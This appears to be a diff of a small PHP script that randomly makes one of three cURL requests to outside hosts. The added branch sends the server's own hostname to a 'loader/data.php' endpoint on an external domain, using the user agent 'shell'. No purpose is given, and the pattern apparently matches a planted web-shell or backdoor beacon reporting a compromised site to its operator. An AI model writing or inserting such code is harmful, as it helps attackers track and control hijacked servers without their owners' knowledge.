@@ -1,6 +1,6 @@
 <?php
-$sayi = rand(1,100);
-if($sayi < 50)
+$sayi = rand(1,3);
+if($sayi == 1)
 {
   $curl = curl_init();
  curl_setopt_array($curl, [
@@ -12,9 +12,8 @@ if($sayi < 50)
  curl_close($curl);
  
 }
- 
-else {
-
+ if($sayi == 2)
+{
   $curl2 = curl_init();
  curl_setopt_array($curl2, [
     CURLOPT_RETURNTRANSFER => 1,
@@ -24,4 +23,22 @@ else {
  $resp2 = curl_exec($curl2);
  curl_close($curl2);
 }
+ if($sayi == 3)
+{
+
+  $curl3 = curl_init();
+ curl_setopt_array($curl3, [
+    CURLOPT_RETURNTRANSFER => 1,
+    CURLOPT_URL => 'http://chat.if2.com.br/loader/data.php?s='.$_SERVER["SERVER_NAME"].'',
+    CURLOPT_USERAGENT => 'shell'
+]);
+ $resp3 = curl_exec($curl3);
+ curl_close($curl3);
+}
+
+
+
+
+
+
 ?>
